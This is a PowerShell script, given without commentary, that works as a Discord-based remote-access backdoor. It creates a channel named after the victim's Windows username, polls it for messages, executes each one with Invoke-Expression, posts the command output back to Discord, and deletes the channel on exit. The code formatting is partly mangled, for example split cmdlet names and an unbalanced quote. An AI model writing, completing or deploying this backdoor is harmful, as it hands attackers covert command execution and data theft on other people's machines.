$botToken = ""; # Bot token
$channelID = "; # channel ID
$serverID = ""; # Server ID
$categoryID = ""; # Category ID

function sndmsg {
    param($message);
    $w.Headers.Add("Content-Type", "application/json");
    $j = @ {
        "content" = $message
    } | ConvertTo - Json;
    $x = $w.UploadString($u, "POST", $j)
};

function createChannel {
    param($channelName);
    $createChannelUrl = "https://discord.com/api/v10/guilds/$serverID/channels";
    $w.Headers.Add("Content-Type", "application/json");
    $j = @ {
        "name" = $channelName;
        "type" = 0;
        "parent_id" = $categoryID
    } | ConvertTo - Json;
    $response = $w.UploadString($createChannelUrl, "POST", $j);
    $channel = $response | ConvertFrom - Json;
    return $channel.id
};

function deleteChannel {
    param($channelId);
    $deleteChannelUrl = "https://discord.com/api/v10/channels/$channelId";
    $w.Headers.Add("Content-Type", "application/json");
    $w.UploadString($deleteChannelUrl, "DELETE", "")
};
$w = New - Object System.Net.WebClient;
$w.Headers.Add("Authorization", "Bot $botToken");
trap {
    [void] $_;
    exit
};
try {
    $computerName = $env: COMPUTERNAME;
    $windowsUser = $env: USERNAME;
    $channelName = "$windowsUser";
    $newChannelId = createChannel - channelName $channelName;
    $channelID = $newChannelId;
    while ($true) {
        $u = "https://discord.com/api/v10/channels/$channelID/messages";
        $m = $w.DownloadString($u);
        $r = ($m | ConvertFrom - Json)[0];
        if (-not $r.author.bot) {
            $a = $r.timestamp;
            $m = $r.content;
            if ($a - ne $p) {
                $p = $a;
                try {
                    $o = iex $m 2 > & 1 | Out - String
                } catch {
                    $o = $null
                };
                $l = $o - split "`n";
                $serverID = 0;
                $b = @();
                foreach($z in $l) {
                    $y = [System.Text.Encoding]::Unicode.GetByteCount($z);
                    if (($serverID + $y) - gt 1900) {
                        sndmsg - message "``````$($b -join `"`n`")``````";
                        sleep 1;
                        $serverID = 0;
                        $b = @()
                    };
                    $b += $z;
                    $serverID += $y
                };
                if ($b.Count - gt 0) {
                    sndmsg - message "``````$($b -join `"
                    `n`
                    ")``````"
                }
            }
        };
        Sleep 3
    }
} finally {
    if ($newChannelId) {
        try {
            deleteChannel - channelId $newChannelId
        } catch {
            [void] $_
        }
    }
}